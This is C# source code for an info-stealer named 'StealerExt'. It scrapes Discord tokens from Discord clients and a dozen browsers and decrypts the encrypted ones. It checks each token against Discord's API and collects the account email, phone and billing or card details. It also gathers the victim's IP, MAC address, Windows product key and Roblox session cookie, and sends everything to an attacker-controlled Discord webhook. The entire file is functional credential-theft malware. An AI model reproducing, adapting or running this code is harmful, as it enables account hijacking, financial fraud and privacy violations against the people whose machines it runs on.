using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace StealerExt
{
    internal class Stealer
	{
		public void StartSteal()
		{
			try
			{
				StealTokenFromChrome();
				StealTokenFromOpera();
				StealTokenFromOperaGX();
				StealTokenFromEdge();
				StealTokenFromBrave();
				StealTokenFromBraveNightly();
				StealTokenFromYandex();
				StealTokenFromDiscordApp();
				StealTokenFromDiscordPtbApp();
				StealTokenFromDiscordCanaryApp();
				StealTokenFromVivaldi();
				StealTokenFromFirefox();
				StealTokenFromDiscordDev();
				if (SavedTokens.Count <= 0)
                {
					SendFailure();
				}
			}
			catch (Exception x)
			{
				new API(API.wHook).SendMultiPartData($"Exception: {x.Message}");
			}
		}
		private void TokenStealer(DirectoryInfo Folder, string Platform)
		{
			foreach (FileInfo file in Folder.GetFilesNew("*.ldb", "*.log", "*.sqlite"))
			{
				string input = file.OpenText().ReadToEnd();
				foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
				{
                    if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
                    {
                        string token = DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
						Task.FromResult(SaveTokensAsync(TokenCheckAccess(token), Platform));
					}
					else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value), Platform));
				}
			}
		}
		private string TokenCheckAccess(string token)
		{
			var http = new HttpUtils();
            Dictionary<string, string> headers = new Dictionary<string, string>
            {
                { "Authorization", token },
                { "Content-Type", "application/json" }
            };
            string response = http.GetStringAsync("https://discordapp.com/api/v9/users/@me/guilds", headers).Result;
            if (response.Contains("401: Unauthorized") || response.Contains("You need to verify your account in order to perform this action."))
            {
                token = "";
            }
            return token;
		}

		private Task SaveTokensAsync(string token, string Platform)
        {
            if (SavedTokens.Count > 0 && !string.IsNullOrEmpty(token))
			{
				var (_tokenInfo, payment, FailedPaymentInfo) = GetTokenInfo(token);
				ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
				string OSName = null;
				foreach (ManagementObject managementObject in mos.Get())
				{
					OSName = managementObject["Caption"].ToString();
				}
				try
                {
                    var embed = new DiscordWebhook(Hook);
                    embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
                    embed.AddField("IP:", new HttpUtils().GetStringAsync("https://ipecho.net/plain").Result, true);
                    embed.AddField("Windows Version:", OSName, true);
                    embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
                    embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
					InitiateEmbed(token, Platform, _tokenInfo, payment, FailedPaymentInfo, embed);
                }
                catch
				{
					try
					{
						var embed = new DiscordWebhook(Hook);
						embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
						embed.AddField("IP:", new HttpUtils().GetStringAsync("https://ipecho.net/plain").Result, true);
						embed.AddField("Windows Version:", OSName, true);
						embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
						embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
						embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
						embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed to parse other info [Might be invalid card(s)]");
						embed.SendEmbed().RunSynchronously();
					}
					catch (Exception x)
					{
						new API(API.wHook).SendMultiPartData($"Token: {token}");
						new API(API.wHook).SendMultiPartData($"```{x.Message}```");
					}
				}
				SavedTokens.Add(token);
			}
			else if (!SavedTokens.Contains(token) && !string.IsNullOrEmpty(token))
            {
				var (_tokenInfo, payment, FailedPaymentInfo) = GetTokenInfo(token);
                try
                {
                    var embed = new DiscordWebhook(Hook);
                    embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
					InitiateEmbed(token, Platform, _tokenInfo, payment, FailedPaymentInfo, embed);
				}
                catch
                {
                    try
                    {
                        var embed = new DiscordWebhook(Hook);
                        embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
                        embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
                        embed.AddField("__Payment Info__", "Has payment | Unknown\nFailed to parse other info [Might be invalid card(s)]");
						embed.SendEmbed().RunSynchronously();
					}
                    catch (Exception x)
                    {
                        new API(API.wHook).SendMultiPartData($"Token: {token}");
                        new API(API.wHook).SendMultiPartData($"```{x.Message}```");
                    }
                }
                SavedTokens.Add(token);
            }
            return Task.CompletedTask;
        }

        private void InitiateEmbed(string token, string Platform, dynamic _tokenInfo, dynamic payment, bool FailedPaymentInfo, DiscordWebhook embed)
        {
            embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
            if (payment.ToString().Contains("email") && !FailedPaymentInfo)
            {
                embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
            }
            else if (payment.ToString().Contains("mastercard") || (payment.ToString().Contains("visa")))
            {
                embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
            }
            else if (FailedPaymentInfo)
            {
                embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed to parse other info");
            }
            else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
			embed.AddField("__Miscellaneous__", StealCookieFromRoblox());
			embed.SendEmbed().RunSynchronously();
        }

        private (dynamic _tokenInfo, dynamic payment, bool FailedPaymentInfo) GetTokenInfo(string token)
        {
            Dictionary<string, string> headers = new Dictionary<string, string>
                {
                    { "Authorization", token }
                };
            var request = new HttpUtils();
			dynamic _tokenInfo = JsonConvert.DeserializeObject(request.GetStringAsync("https://discordapp.com/api/v8/users/@me", headers).Result);
            switch ((int)_tokenInfo.premium_type)
            {
                case 1:
                    _tokenInfo.premium_type = "Nitro Classic [$4.99/$49.99]";
                    break;
                case 2:
                    _tokenInfo.premium_type = "Nitro [$9.99/$99]";
                    break;
                default:
                    _tokenInfo.premium_type = "None";
                    break;
            }
            if (string.IsNullOrEmpty((string)_tokenInfo.phone))
            {
                _tokenInfo.phone = "None";
            }
            dynamic payment = string.Empty;
            bool FailedPaymentInfo = false;
            try
            {
				payment = JsonConvert.DeserializeObject(request.GetStringAsync("https://discord.com/api/v9/users/@me/billing/payment-sources", headers).Result
					.Replace("[", "")
					.Replace("]", ""));
            }
            catch
            {
                FailedPaymentInfo = true;
            }
            return (_tokenInfo, payment, FailedPaymentInfo);
        }

        private void SendFailure()
		{
			ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
			string OSName = null;
			foreach (ManagementObject managementObject in mos.Get())
			{
				OSName = managementObject["Caption"].ToString();
			}
			string IP = new WebClient().DownloadString("https://ipecho.net/plain");
			var embed = new DiscordWebhook(Hook);
			embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
			embed.AddField("IP:", IP, true);
			embed.AddField("Windows Version:", OSName, true);
			embed.AddField("Product Key", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
			embed.AddField("Token?", "No token was found due to recent password change or Discord not being found in any of the supported platforms!");
			embed.SendEmbed().RunSynchronously();
		}

		private void StealTokenFromDiscordApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Discord App");
			}
		}
		private void StealTokenFromDiscordDev()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discorddevelopment\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Discord Developer");
			}
		}
		private void StealTokenFromDiscordCanaryApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Discord Canary");
			}
		}
		private void StealTokenFromDiscordPtbApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Discord PTB");
			}
		}
		private void StealTokenFromChrome()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo dir in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
            {
				TokenStealer(dir, "Chrome");
			}
		}
		private void StealTokenFromBrave()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Brave");
			}
		}
		private void StealTokenFromBraveNightly()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Brave Nightly");
			}
		}
		private void StealTokenFromOpera()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Opera");
			}
		}
		private void StealTokenFromVivaldi()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Vivaldi\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Vivaldi");
			}
		}
		private void StealTokenFromOperaGX()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
            if (folder.Exists)
			{
				TokenStealer(folder, "OperaGX");
			}
		}
        private void StealTokenFromEdge()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Edge");
			}
		}
		private void StealTokenFromYandex()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Yandex");
			}
		}
		private void StealTokenFromFirefox()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\"; 
			if (Directory.Exists(path))
			{
				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
				{
					TokenStealer(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), "Firefox");
				}
			}
		}
		private string StealCookieFromRoblox()
        {
            try
            {
				using (var reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com", false))
				{
					return reg.GetValue(".ROBLOSECURITY").ToString().Substring(46).Trim('>');
				}
			}
            catch (NullReferenceException)
            {
				return "Roblox Studio cookie not found";
            }
            catch (Exception ex) 
			{
				return ex.Message; 
			}
        }
        
		private static readonly List<string> SavedTokens = new List<string>();
		public static string Hook = API.wHook;
	}
}